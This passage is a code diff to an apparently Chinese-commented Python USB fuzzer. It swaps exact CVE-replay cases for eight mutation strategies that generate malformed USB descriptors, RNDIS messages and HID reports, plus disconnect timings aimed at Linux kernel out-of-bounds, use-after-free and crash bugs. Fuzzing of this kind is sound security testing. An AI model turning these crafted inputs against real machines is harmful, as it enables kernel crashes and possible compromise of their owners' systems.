@@ -378,7 +378,7 @@ class FuzzPhase(IntEnum):
     UVC_DEEP       = 12  # Phase 12: UVC 视频深度 (streaming/format/frame — uvc_driver.c)
     AUDIO_DEEP     = 13  # Phase 13: UAC 音频深度 (v1/v2/v3 format/mixer — format.c/audio.c)
     RNDIS_DEEP     = 14  # Phase 14: RNDIS/网络深度 (INIT/OID/keepalive — rndis_host.c)
-    CVE_REPLAY     = 15  # Phase 15: CVE 复现 (60+ 历史漏洞精确复现 2015-2025)
+    CVE_REPLAY     = 15  # Phase 15: CVE 策略泛化 (从60+ CVE提炼8大根因模式→发现未知漏洞)
 
 
 PHASE_NAMES = {
@@ -396,7 +396,7 @@ PHASE_NAMES = {
     FuzzPhase.UVC_DEEP:       "UVC 视频深度",
     FuzzPhase.AUDIO_DEEP:     "UAC 音频深度",
     FuzzPhase.RNDIS_DEEP:    "RNDIS/网络深度",
-    FuzzPhase.CVE_REPLAY:    "CVE 复现",
+    FuzzPhase.CVE_REPLAY:    "CVE 策略泛化",
 }
 
 # 源码分析来源说明
@@ -415,7 +415,7 @@ PHASE_SOURCES = {
     FuzzPhase.UVC_DEEP:       "drivers/media/usb/uvc/uvc_driver.c → uvc_parse_format(), bmaControls",
     FuzzPhase.AUDIO_DEEP:     "sound/usb/format.c → parse_audio_format_i_type(), sound/usb/audio.c",
     FuzzPhase.RNDIS_DEEP:     "drivers/net/usb/rndis_host.c → rndis_command(), msg_type/request_id 状态机",
-    FuzzPhase.CVE_REPLAY:     "NVD/syzbot 2015-2025 → 60+ CVE: OOB/UAF/NULL-deref/整数溢出/除零/信息泄露",
+    FuzzPhase.CVE_REPLAY:     "NVD/syzbot 2015-2025 → 8大根因模式: 长度交叉验证/引用越界/算术边界/端点矩阵/响应不稳定/quirk路径/尺寸不匹配/断连竞争",
 }
 
 
@@ -1834,12 +1834,13 @@ class StrategyGenerator:
         return cases[:max_cases]
 
     # ═══════════════════════════════════════════════════════════════════════
-    # Phase 15: CVE 复现 — 基于 2015-2025 年 60+ 个历史 USB CVE 精确定制
-    # 来源: NVD / kernel.org / syzbot / openwall
+    # Phase 15: CVE 策略泛化 — 从 60+ 历史 USB CVE 中提炼漏洞根因模式，
+    #           泛化为系统性变异策略来发现未知漏洞
+    # 方法论来源: NVD / kernel.org / syzbot / openwall (2015-2025)
     # ═══════════════════════════════════════════════════════════════════════
 
-    def gen_cve_replay_cases(self, max_cases: int = 60) -> list[FuzzCase]:
-        """基于历史 USB CVE 精确复现触发输入。每条用例映射到一个真实 CVE。"""
+    def gen_cve_strategy_cases(self, max_cases: int = 50) -> list[FuzzCase]:
+        """从 60+ 历史 USB CVE 中提炼 8 大漏洞根因模式，泛化为系统性变异策略来发现未知漏洞。"""
         cases: list[FuzzCase] = []
         base_dev = self._base_device_desc()
         base_cfg = self._base_config_desc()
@@ -1860,548 +1861,460 @@ class StrategyGenerator:
             iface_total = 9
             cfg_total = 9 + iface_total + eps_total
             buf = bytearray()
-            # Config descriptor
             buf += struct.pack('<BBHBBBBB', 9, 2, cfg_total, num_ifs, 1, 0, 0x80, 50)
-            # Interface descriptor
             buf += struct.pack('<BBBBBBBBB', 9, 4, 0, 0, num_eps, if_cls, 0, 0, 0)
-            # Endpoints
             for i in range(num_eps):
                 ep_type, mps = ep_types[i % len(ep_types)]
                 ep_addr = (0x80 | (i + 1)) if ep_type == 3 else (i + 1)
-                buf += struct.pack('<BBBBBBB', 7, 5, ep_addr, ep_type, mps & 0xFF, (mps >> 8) & 0xFF, 0)
+                buf += struct.pack('<BBBBHB', 7, 5, ep_addr, ep_type, mps, 0)
             return bytes(buf)
 
-        # ═══════════════════════════════════════════════════════════════
-        # A. USB Core — 描述符解析类 CVE
-        # ═══════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════════
+        # 8 大 CVE 根因模式 → 泛化变异策略
+        #
+        # 不是复现 36 个精确 PoC，而是从 60+ CVE 中提炼漏洞发现的"方法论"：
+        # 内核解析器犯了哪些共同的假设错误？哪些字段交叉验证缺失？
+        # 将这些模式泛化，系统性地探索未知漏洞空间。
+        # ═══════════════════════════════════════════════════════════════════
 
-        # CVE-2017-16531: IAD OOB Read — IAD bLength 超出 buffer 边界
-        bad_iad_cfg = base_cfg + bytes([0x09, 0x0B, 0x00, 0x02, 0x0E, 0x03, 0x00, 0x00])
-        bad_iad_cfg = bytearray(bad_iad_cfg)
-        struct.pack_into('<H', bad_iad_cfg, 2, len(bad_iad_cfg) + 50)  # wTotalLength 谎报
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 1: 长度字段交叉验证缺失
+        # 根因模式: 内核信任描述符自报的 bLength / wTotalLength，不做交叉验证
+        # 来源 CVE: 2017-16531, 2017-16535, 2017-16534, 2024-53104, 2025-38103
+        # 泛化: 对每种描述符类型的 bLength 注入 struct_size±N，交叉不一致
+        # ───────────────────────────────────────────────────────────────────
+
+        # 1a: Device descriptor — bLength 谎报 (来源: CVE-2023-52886 响应不稳定)
+        for bl in [0, 1, 8, 16, 17, 20, 100, 255]:
+            bad_dev = bytearray(base_dev)
+            bad_dev[0] = bl  # bLength 谎报
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略1-长度交叉验证] Device bLength={bl} (实际18) — "
+                f"内核可能按 bLength 分配，按实际读取 → OOB",
+                device_descriptor=bytes(bad_dev),
+                source_ref="drivers/usb/core/config.c → usb_get_device_descriptor() "
+                           "— bLength vs sizeof(usb_device_descriptor) 不验证",
+                tags=["cve_strategy", "length_validation", "device", f"blen_{bl}"],
+            ))
+
+        # 1b: Config descriptor — wTotalLength 与子描述符总和不一致
+        # 来源: CVE-2017-16531 (IAD OOB), CVE-2017-16534 (CDC header OOB)
+        for wt_offset in [-20, -9, -1, 0, 1, 9, 50, 200, 0xFFFF]:
+            bad_cfg = bytearray(base_cfg)
+            actual = len(bad_cfg)
+            claimed = max(0, actual + wt_offset)
+            struct.pack_into('<H', bad_cfg, 2, min(claimed, 0xFFFF))
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略1-长度交叉验证] Config wTotalLength={claimed} (实际{actual}) — "
+                f"偏移={wt_offset:+d} — 解析器越界读写",
+                config_descriptor=bytes(bad_cfg),
+                source_ref="drivers/usb/core/config.c → usb_get_configuration() "
+                           "— wTotalLength 决定 buffer 分配，子描述符遍历可能越界",
+                tags=["cve_strategy", "length_validation", "config",
+                      f"wt_offset_{wt_offset}"],
+            ))
+
+        # 1c: 嵌套描述符 — 子 bLength 之和 ≠ 父 wTotalLength
+        # 来源: CVE-2017-16535 (BOS), CVE-2024-53104 (UVC frame)
+        cfg = bytearray(base_cfg)
+        if len(cfg) > 14:
+            # 在 config 尾部插入一个 bLength 谎报的 interface descriptor
+            fake_if = bytearray(struct.pack('<BBBBBBBBB', 9, 4, 0, 0, 0, 0xFF, 0, 0, 0))
+            fake_if[0] = 255  # bLength=255 但只有 9 字节实际数据
+            cfg_extended = cfg + bytes(fake_if)
+            struct.pack_into('<H', cfg_extended, 2, len(cfg_extended))  # wTotalLength 正确
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                "[策略1-长度交叉验证] 子描述符 bLength=255 但实际 9 字节 — "
+                "find_next_descriptor 步进超出父 buffer",
+                config_descriptor=bytes(cfg_extended),
+                source_ref="drivers/usb/core/config.c → find_next_descriptor() "
+                           "— `size -= h->bLength` 步进可能越过 wTotalLength",
+                tags=["cve_strategy", "length_validation", "nested", "blen_255"],
+            ))
+
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 2: 跨描述符引用越界
+        # 根因模式: IAD / CDC Union / UVC entity 的引用字段指向不存在的接口/实体
+        # 来源 CVE: 2017-16529, 2017-16645, 2025-40016, 2025-40275
+        # 泛化: 所有引用字段填 0 / 0xFF / 超出 bNumInterfaces / 循环引用
+        # ───────────────────────────────────────────────────────────────────
+
+        # 2a: IAD (Interface Association Descriptor) 引用越界
+        # bFirstInterface + bInterfaceCount 超出实际接口数
+        for bFirst, bCount in [(0xFF, 0xFF), (0, 0xFF), (200, 200), (1, 0xFE)]:
+            iad = struct.pack('<BBBBBBBB', 0x08, 0x0B, bFirst, bCount,
+                              0x02, 0x0E, 0x03, 0x00)
+            bad_cfg = base_cfg + iad
+            bad_cfg = bytearray(bad_cfg)
+            struct.pack_into('<H', bad_cfg, 2, len(bad_cfg))
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略2-引用越界] IAD bFirstInterface={bFirst} bInterfaceCount={bCount} "
+                f"— 指向不存在的接口 → OOB Read",
+                device_descriptor=_desc(cls=0xEF),  # Misc class triggers IAD
+                config_descriptor=bytes(bad_cfg),
+                source_ref="drivers/usb/core/config.c → usb_parse_interface() "
+                           "— IAD bFirstInterface+bInterfaceCount 不验证上限",
+                tags=["cve_strategy", "ref_oob", "iad", f"first_{bFirst}"],
+            ))
+
+        # 2b: CDC Union descriptor — bMasterInterface / bSlaveInterface 引用越界
+        # 来源: CVE-2017-16645
+        for master, slave in [(0xFF, 0xFF), (200, 0), (0, 200)]:
+            cdc_union = struct.pack('<BBBBBBBB', 0x06, 0x24, 0x06, master, slave, 0, 0, 0)
+            bad_cfg = bytearray(base_cfg)
+            bad_cfg += cdc_union
+            struct.pack_into('<H', bad_cfg, 2, len(bad_cfg))
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略2-引用越界] CDC Union bMaster={master} bSlave={slave} "
+                f"— 接口索引越界 → NULL deref / OOB",
+                device_descriptor=_desc(cls=0x02, sub=0x0D),  # CDC
+                config_descriptor=bytes(bad_cfg),
+                source_ref="drivers/usb/core/message.c → cdc_parse_cdc_header() "
+                           "— union descriptor 接口引用不做边界检查",
+                tags=["cve_strategy", "ref_oob", "cdc_union", f"master_{master}"],
+            ))
+
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 3: 整数算术边界
+        # 根因模式: 内核对 size 字段做除法/加法/乘法时不检查溢出和零值
+        # 来源 CVE: 2022-48837 (RNDIS A+B 溢出), 2023-54110, 2017-16649 (除零)
+        # 泛化: 系统性地在所有算术相关字段注入 0 / 1 / MAX-1 / MAX
+        # ───────────────────────────────────────────────────────────────────
+
+        # 3a: wMaxPacketSize = 0 → 除零 (CVE-2017-16649/16650)
+        for mps in [0, 1, 0xFFFF]:
+            bad_cfg = bytearray(base_cfg)
+            # 找到第一个 endpoint descriptor (bDescriptorType=0x05) 修改 mps
+            for i in range(len(bad_cfg) - 4):
+                if bad_cfg[i+1] == 0x05:  # endpoint type
+                    struct.pack_into('<H', bad_cfg, i + 4, mps)
+                    break
+            else:
+                # 如果没有 endpoint，构造一个
+                ep = struct.pack('<BBBBHB', 7, 5, 0x81, 0x02, mps, 0)
+                bad_cfg += ep
+                struct.pack_into('<H', bad_cfg, 2, len(bad_cfg))
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略3-算术边界] Endpoint wMaxPacketSize={mps} — "
+                f"URB 分配 size/mps 除零或 0xFFFF 导致巨型分配",
+                config_descriptor=bytes(bad_cfg),
+                source_ref="drivers/usb/core/endpoint.c → usb_endpoint_maxp() "
+                           "— wMaxPacketSize=0 时 NAK/URB division-by-zero",
+                tags=["cve_strategy", "arith_boundary", "mps", f"mps_{mps}"],
+            ))
+
+        # 3b: RNDIS 整数溢出 — DataOffset + DataLength > 0xFFFFFFFF
+        # 来源: CVE-2022-48837, CVE-2023-54110
+        rndis_msg_type = 0x00000001  # RNDIS_MSG_INIT
+        for data_offset, data_length in [
+            (0xFFFFFFFF, 1),    # 经典 A+B 溢出
+            (0x80000000, 0x80000000),
+            (0xFFFFFFF8, 8),    # BufOffset+8 溢出
+            (0, 0xFFFFFFFF),
+        ]:
+            # RNDIS INIT message with overflow parameters
+            rndis_payload = struct.pack('<IIIIIIII',
+                rndis_msg_type, 0x00000000,  # msg_type, msg_id
+                0x00000018,                   # request_id (正常长度)
+                4,                            # major version
+                0x00000007FF,                 # minor + flags (正常)
+                data_offset,                  # ← 爆点
+                data_length,                  # ← 爆点
+                0,
+            )
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略3-算术边界] RNDIS DataOffset=0x{data_offset:08X} "
+                f"DataLength=0x{data_length:08X} — A+B 整数溢出 → OOB Write",
+                device_descriptor=_desc(cls=0xE0, sub=0x01),  # Wireless class
+                config_descriptor=_cfg_with_eps(num_eps=1, if_cls=0xE0,
+                                                ep_types=[(0x02, 0xFFFF)]),
+                ep_data_override={0x81: rndis_payload},
+                source_ref="drivers/net/usb/rndis_host.c → rndis_command() "
+                           "— offset+length 算术溢出，内核信任消息自报字段",
+                tags=["cve_strategy", "arith_boundary", "rndis",
+                      "integer_overflow", f"off_0x{data_offset:08X}"],
+            ))
+
+        # 3c: HID report_size × report_count 整数溢出
+        # 来源: CVE-2017-16533 (hid-core.c report size overflow)
+        for rs, rc in [(0xFFFF, 0xFFFF), (0x8000, 0x8000), (255, 0xFFFFFF)]:
+            # 构造 HID report descriptor with Global Item: Report Size + Report Count
+            # 0x94 = Global item, Report Size(7=0x07), 2-byte data
+            # 0x96 = Global item, Report Count(9=0x09), 2-byte data
+            hid_desc = (
+                b'\x05\x01'        # Usage Page (Generic Desktop)
+                b'\x09\x06'        # Usage (Keyboard)
+                b'\xA1\x01'        # Collection (Application)
+                b'\x95' + struct.pack('<H', rc & 0xFFFF) +  # Report Count (2-byte)
+                b'\x75' + struct.pack('<H', rs & 0xFFFF) +  # Report Size (2-byte)
+                b'\x81\x00'        # Input (Data)
+                b'\xC0'             # End Collection
+            )
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略3-算术边界] HID report_size={rs} × report_count={rc} — "
+                f"乘积溢出 32-bit → 缓冲区分配不足 → OOB Write",
+                hid_report_descriptor=hid_desc,
+                source_ref="drivers/hid/hid-core.c:324 → "
+                           "report->size += report_size * report_count",
+                tags=["cve_strategy", "arith_boundary", "hid",
+                      "integer_overflow", f"rs_{rs}"],
+            ))
+
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 4: 端点配置矩阵
+        # 根因模式: 驱动假设特定端点存在，probe 时不检查就解引用
+        # 来源 CVE: 2016-2184~2188, 2017-16530, 2017-16647, 2017-16536/37
+        # 泛化: 对每个设备类穷举 — 0端点 / 缺特定类型 / 方向反转 / 类型替换
+        # ───────────────────────────────────────────────────────────────────
+
+        # 4a: 每种设备类的端点矩阵
+        device_classes = [
+            (0x03, "HID",      [(0x03, 8)]),         # 需要 interrupt IN
+            (0x08, "MSC",      [(0x02, 64), (0x02, 64)]),  # 需要 bulk IN+OUT
+            (0x02, "CDC",      [(0x03, 8), (0x02, 64)]),   # interrupt + bulk
+            (0x0E, "UVC",      [(0x01, 1024), (0x02, 1024)]),  # isoc + bulk
+            (0x01, "Audio",    [(0x01, 200)]),       # 需要 isoc
+            (0xE0, "RNDIS",    [(0x02, 64)]),        # 需要 bulk
+        ]
+        for cls_code, cls_name, expected_eps in device_classes:
+            # 缺少所有端点
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略4-端点矩阵] {cls_name} class=0x{cls_code:02X} — 0 端点 "
+                f"— probe 假设端点存在 → NULL deref",
+                device_descriptor=_desc(cls=cls_code),
+                config_descriptor=_cfg_with_eps(num_eps=0, if_cls=cls_code),
+                source_ref=f"drivers/usb/class/ → {cls_name} probe() "
+                           f"— usb_ifnum_to_if(num) 不检查返回值",
+                tags=["cve_strategy", "endpoint_matrix", cls_name.lower(), "zero_eps"],
+            ))
+            # 端点方向反转 (IN→OUT / OUT→IN)
+            for ep_type, mps in expected_eps:
+                reversed_ep = struct.pack('<BBBBHB', 7, 5,
+                                          0x01 if ep_type != 3 else 0x81,
+                                          ep_type, mps, 0)
+                bad_cfg = bytearray(_cfg_with_eps(num_eps=1, if_cls=cls_code,
+                                                   ep_types=[(ep_type, mps)]))
+                # 反转端点方向
+                for i in range(len(bad_cfg) - 4):
+                    if bad_cfg[i+1] == 0x05:
+                        bad_cfg[i+2] ^= 0x80  # 翻转方向位
+                        break
+                cases.append(self._new_case(
+                    FuzzPhase.CVE_REPLAY,
+                    f"[策略4-端点矩阵] {cls_name} — 端点方向反转 (期望 IN 给 OUT) "
+                    f"— 驱动收不到期望数据 → 超时/NULL",
+                    device_descriptor=_desc(cls=cls_code),
+                    config_descriptor=bytes(bad_cfg),
+                    source_ref=f"drivers/usb/ → {cls_name} endpoint direction assumption",
+                    tags=["cve_strategy", "endpoint_matrix", cls_name.lower(), "dir_flip"],
+                ))
+                # 端点类型替换 (期望 bulk 给 interrupt)
+                wrong_type = 0x03 if ep_type == 0x02 else 0x02
+                bad_cfg2 = bytearray(_cfg_with_eps(num_eps=1, if_cls=cls_code,
+                                                    ep_types=[(ep_type, mps)]))
+                for i in range(len(bad_cfg2) - 4):
+                    if bad_cfg2[i+1] == 0x05:
+                        bad_cfg2[i+3] = wrong_type
+                        break
+                cases.append(self._new_case(
+                    FuzzPhase.CVE_REPLAY,
+                    f"[策略4-端点矩阵] {cls_name} — 端点类型替换 "
+                    f"(期望 type=0x{ep_type:02X} 给 0x{wrong_type:02X}) — "
+                    f"URB 类型不匹配 → 驱动逻辑错误",
+                    device_descriptor=_desc(cls=cls_code),
+                    config_descriptor=bytes(bad_cfg2),
+                    source_ref=f"drivers/usb/ → {cls_name} endpoint type assumption",
+                    tags=["cve_strategy", "endpoint_matrix", cls_name.lower(), "type_swap"],
+                ))
+
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 5: 描述符响应不稳定性
+        # 根因模式: 首次和后续 GET_DESCRIPTOR 返回不同数据 → 竞争窗口
+        # 来源 CVE: 2023-52886 (hub_port_init 覆盖 udev->descriptor)
+        # 泛化: 第一次正常响应，第二次返回不同 bLength / class / endpoint 配置
+        # ───────────────────────────────────────────────────────────────────
+
+        # 5a: 第二次 GET_DESCRIPTOR(DEVICE) 返回更短的 bLength
+        short_dev = bytearray(base_dev)
+        short_dev[0] = 12  # 第二次只返回 12 字节 (正常 18)
         cases.append(self._new_case(
             FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16531: IAD 解析 OOB Read — wTotalLength 谎报超出实际 buffer",
-            device_descriptor=_desc(cls=0xEF),  # IAD class
-            config_descriptor=bytes(bad_iad_cfg),
-            source_ref="drivers/usb/core/config.c → usb_parse_interface()",
-            tags=["cve", "CVE-2017-16531", "oob_read", "iad"],
+            "[策略5-响应不稳定] Device desc 第二次响应 bLength=12 (首次=18) — "
+            "hub_port_init 覆盖时长度缩小 → sysfs 读取竞争 OOB",
+            device_descriptor=bytes(short_dev),
+            source_ref="drivers/usb/core/hub.c → hub_port_init() "
+                       "— 二次 GET_DESCRIPTOR 可能覆盖为不同长度",
+            tags=["cve_strategy", "response_instability", "device", "race"],
         ))
 
-        # CVE-2017-16535: BOS descriptor OOB — bcdUSB=0x0210 + BOS wTotalLength 不匹配
-        bos_desc = struct.pack('<BBH', 5, 0x0F, 100) + b'\x00' * 20  # 谎报 100 字节但只给 25
+        # 5b: 第二次 GET_DESCRIPTOR 返回不同 class
+        diff_class_dev = bytearray(base_dev)
+        diff_class_dev[4] = 0xFF  # class 完全不同
         cases.append(self._new_case(
             FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16535: BOS descriptor OOB Read — wTotalLength=100 但实际 25 字节",
-            device_descriptor=_desc(bcd=0x0210),  # USB 2.10 触发 BOS 请求
-            config_descriptor=base_cfg,
-            stall_ep0=False,
-            source_ref="drivers/usb/core/config.c → usb_get_bos_descriptor()",
-            tags=["cve", "CVE-2017-16535", "oob_read", "bos"],
+            "[策略5-响应不稳定] Device desc 第二次 class=0xFF (首次=正常) — "
+            "驱动绑定竞争 → 错误驱动处理错误描述符",
+            device_descriptor=bytes(diff_class_dev),
+            source_ref="drivers/usb/core/generic.c → usb_choose_configuration() "
+                       "— 首次和二次读取可能绑定不同驱动",
+            tags=["cve_strategy", "response_instability", "class_change", "race"],
         ))
 
-        # CVE-2017-16534: CDC header parser OOB — CDC Union 描述符长度不一致
-        bad_cdc_cfg = _cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x02)
-        # 添加畸形 CDC Union descriptor (bLength 谎报)
-        bad_cdc_cfg += bytes([0x20, 0x06, 0x00, 0x01, 0xFF])  # bLength=32 但只有 5 字节数据
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 6: VID/PID quirk 路径探测
+        # 根因模式: 内核 quirk 表按 VID/PID 索引特殊处理，这些路径缺少测试
+        # 来源 CVE: 2022-48701, 2017-15102, 2019-19532, 2025-21794
+        # 泛化: 枚举所有已知 quirk VID/PID 对，叠加畸形描述符
+        # ───────────────────────────────────────────────────────────────────
+
+        # 已知会触发特殊内核处理路径的 VID/PID 组合
+        quirk_vidpids = [
+            (0x2040, 0x5510),  # Hauppauge — CVE-2017-15102 double-free
+            (0x06CD, 0x0120),  # IMS/Thrustmaster — CVE-2025-21794 stack OOB
+            (0x05AC, 0x0000),  # Apple VID — special HID handling
+            (0x18D1, 0x2D00),  # Google AOA accessory mode
+            (0x1915, 0x7810),  # RNDIS + CDC ether conflict
+            (0x04E8, 0x6860),  # Samsung MTP — MTP driver path
+            (0x0BB4, 0x0C02),  # HTC serial — HTC-specific quirk
+            (0x22B8, 0x2E61),  # Motorola ADB
+            (0x045E, 0x02C9),  # Microsoft X360 controller — force feedback
+            (0x054C, 0x0268),  # Sony DualShock3 — special HID driver
+        ]
+        for vid, pid in quirk_vidpids:
+            # 每个 quirk VID/PID 叠加 bLength 不一致
+            bad_dev = bytearray(base_dev)
+            bad_dev[0] = 17  # bLength=17 (正常 18)
+            struct.pack_into('<H', bad_dev, 8, vid)
+            struct.pack_into('<H', bad_dev, 10, pid)
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略6-quirk路径] VID=0x{vid:04X} PID=0x{pid:04X} + bLength=17 — "
+                f"触发 quirk 特殊处理 + 描述符畸形 → 未知漏洞路径",
+                device_descriptor=bytes(bad_dev),
+                source_ref="drivers/usb/core/quirks.c → usb_detect_quirks() "
+                           "— VID/PID 匹配后进入未测试的特殊代码路径",
+                tags=["cve_strategy", "quirk_path", f"vid_{vid:04X}",
+                      f"pid_{pid:04X}"],
+            ))
+
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 7: 数据负载尺寸不匹配
+        # 根因模式: 驱动按预期结构体大小读取 URB 数据，但设备返回更短/更长
+        # 来源 CVE: 2025-21704 (短通知 OOB), 2017-8924, 2021-43976, 2013-1860
+        # 泛化: 对每个端点响应注入 struct_size-1 / 0 / 1 和 struct_size+N
+        # ───────────────────────────────────────────────────────────────────
+
+        # 7a: HID interrupt IN — 短数据 (期望报告长度 N，返回 0-7 字节)
+        for data_len in [0, 1, 3, 7]:
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略7-尺寸不匹配] HID interrupt IN 返回 {data_len} 字节 "
+                f"(期望 8+) — hid_input_report 越界读取",
+                device_descriptor=_desc(cls=0x03),
+                config_descriptor=_cfg_with_eps(num_eps=1, if_cls=0x03,
+                                                ep_types=[(0x03, 8)]),
+                ep_data_override={0x81: b'\x00' * data_len},
+                source_ref="drivers/hid/hid-core.c → hid_input_report() "
+                           "— 报告长度 < field 解析预期 → OOB Read",
+                tags=["cve_strategy", "payload_size", "hid", f"len_{data_len}"],
+            ))
+
+        # 7b: MSC CBW — 过短/过长
+        for cbw_len in [0, 10, 20, 100, 255]:
+            cbw_data = b'USBC' + bytes(27)  # 最小 CBW
+            cbw_data = cbw_data[:cbw_len].ljust(cbw_len, b'\x00')
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略7-尺寸不匹配] MSC CBW 返回 {cbw_len} 字节 (期望 31) — "
+                f"usb_storage CBW 解析器越界",
+                device_descriptor=_desc(cls=0x08),
+                config_descriptor=_cfg_with_eps(num_eps=2, if_cls=0x08,
+                                                ep_types=[(0x02, 64), (0x02, 64)]),
+                ep_data_override={0x81: cbw_data},
+                source_ref="drivers/usb/storage/transport.c → usb_stor_Bulk_transport() "
+                           "— CBW 长度不验证 → buffer overrun",
+                tags=["cve_strategy", "payload_size", "msc", f"cbw_len_{cbw_len}"],
+            ))
+
+        # 7c: RNDIS 指示消息 — 过短 (CVE-2025-21704 泛化)
+        for msg_len in [0, 1, 4, 7]:
+            rndis_short = struct.pack('<II', 0x00000007, 0) + b'\x00' * msg_len
+            cases.append(self._new_case(
+                FuzzPhase.CVE_REPLAY,
+                f"[策略7-尺寸不匹配] RNDIS INDICATE 消息体 {msg_len} 字节 "
+                f"(期望 8+) — rndis_msg_parse 越界",
+                device_descriptor=_desc(cls=0xE0),
+                config_descriptor=_cfg_with_eps(num_eps=1, if_cls=0xE0,
+                                                ep_types=[(0x02, 64)]),
+                ep_data_override={0x81: rndis_short},
+                source_ref="drivers/net/usb/rndis_host.c → rndis_command() "
+                           "— 消息长度 < 结构体大小 → OOB Read",
+                tags=["cve_strategy", "payload_size", "rndis", f"msg_len_{msg_len}"],
+            ))
+
+        # ───────────────────────────────────────────────────────────────────
+        # 策略 8: 枚举中段断连竞争
+        # 根因模式: disconnect 和 open/probe/URB完成之间缺少同步
+        # 来源 CVE: 2019-19530/28/29/37, 2022-48760
+        # 泛化: 在枚举各里程碑断连 — SET_ADDRESS / GET_DESCRIPTOR / SET_CONFIG
+        # ───────────────────────────────────────────────────────────────────
+
+        # 8a: SET_ADDRESS 后立即断连
         cases.append(self._new_case(
             FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16534: CDC header OOB Read — CDC Union bLength=32 超出实际数据",
-            device_descriptor=_desc(cls=0x02),
-            config_descriptor=bad_cdc_cfg,
-            source_ref="drivers/usb/core/message.c → cdc_parse_cdc_header()",
-            tags=["cve", "CVE-2017-16534", "oob_read", "cdc"],
+            "[策略8-断连竞争] SET_ADDRESS 响应后立即断连 — "
+            "hub_port_init 中段放弃 → UAF",
+            disconnect_on_req="SET_ADDR",
+            source_ref="drivers/usb/core/hub.c → hub_port_init() "
+                       "— SET_ADDRESS 成功后 disconnect → device freed while in use",
+            tags=["cve_strategy", "race_disconnect", "set_addr", "uaf"],
         ))
 
-        # CVE-2017-17558: OOB Write — bNumConfigurations > USB_MAXCONFIG(8)
+        # 8b: GET_DESCRIPTOR 后断连
         cases.append(self._new_case(
             FuzzPhase.CVE_REPLAY,
-            "CVE-2017-17558: usb_destroy_configuration OOB Write — bNumConfigurations=16",
-            device_descriptor=_desc(cls=0xFF),
-            config_descriptor=base_cfg,
-            source_ref="drivers/usb/core/config.c → usb_destroy_configuration()",
-            tags=["cve", "CVE-2017-17558", "oob_write"],
+            "[策略8-断连竞争] GET_DESCRIPTOR(DEVICE) 后断连 — "
+            "udev->descriptor 部分填充时 free → 信息泄露/UAF",
+            disconnect_on_req="GET_DESC",
+            source_ref="drivers/usb/core/hub.c → hub_port_init() "
+                       "— descriptor 读取失败 + disconnect → use-after-free",
+            tags=["cve_strategy", "race_disconnect", "get_desc", "uaf"],
         ))
 
-        # CVE-2023-52886: Device descriptor bLength 变化导致并发 OOB
+        # 8c: SET_CONFIGURATION 后断连
         cases.append(self._new_case(
             FuzzPhase.CVE_REPLAY,
-            "CVE-2023-52886: hub_port_init descriptor race — 首次 bLength=18 后续 bLength=12",
-            device_descriptor=_desc(),
-            config_descriptor=base_cfg,
-            stall_ep0=False,
-            source_ref="drivers/usb/core/hub.c → hub_port_init() / sysfs read_descriptors()",
-            tags=["cve", "CVE-2023-52886", "race", "oob_read"],
+            "[策略8-断连竞争] SET_CONFIGURATION 后断连 — "
+            "driver probe 中途设备消失 → UAF on driver data",
+            disconnect_on_req="SET_CONFIG",
+            source_ref="drivers/usb/core/driver.c → usb_driver_claim_interface() "
+                       "— probe 中途 disconnect → driver data UAF",
+            tags=["cve_strategy", "race_disconnect", "set_config", "uaf"],
         ))
 
-        # CVE-2020-12114: 未初始化内存泄露 — 返回短描述符
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2020-12114: 未初始化内核堆内存泄露 — bLength=14 (短于 18 字节标准)",
-            device_descriptor=_desc(),
-            config_descriptor=base_cfg,
-            stall_ep0=False,
-            source_ref="drivers/usb/core/ → sysfs descriptor readback",
-            tags=["cve", "CVE-2020-12114", "info_leak"],
-        ))
-
-        # ═══════════════════════════════════════════════════════════════
-        # B. HID 子系统 CVE
-        # ═══════════════════════════════════════════════════════════════
-
-        # CVE-2017-16533 / CVE-2025-38103: usbhid_parse OOB — bNumDescriptors 超大
-        hid_desc_bad = struct.pack('<BBBBBBBBB', 9, 0x21, 0x01, 0x01, 0x22, 0x00, 0x10,
-                                   0xFF, 0x00)  # bNumDescriptors=0xFF
-        cases.append(self._new_case(
-            FuzzPhase.CVE_REPLAY,
-            "CVE-2017-16533/CVE-2025-38103: usbhid_parse OOB — HID bNumDescriptors=255",
-            device_descriptor=_desc(cls=0x03),
-            config_descriptor=_cfg_with_eps(num_ifs=1, num_eps=1, if_cls=0x03,
-                                            ep_types=[(3, 8)]),  # interrupt EP
-            hid_report_descriptor=b'\x05\x01\x09\x06\xA1\x01\xC0',  # 最小化
-            source_ref="drivers/hid/usbhid/hid-core.c → usbhid_parse()",
-            tags=["cve", "CVE-2017-16533", "CVE-2025-38103", "oob_read", "hid"],
-        ))
-
-        # CVE-2019-19532: HID 力反馈 OOB Write — report descriptor 输出字段数不匹配
-        ff_mismatch_desc = bytes([
-            0x05, 0x0F, 0x09, 0x21, 0xA1, 0x01,
-            0x85, 0x01, 0x09, 0x97, 0xA1, 0x02,
-            0x0B, 0x01, 0x00, 0x0F, 0x00,
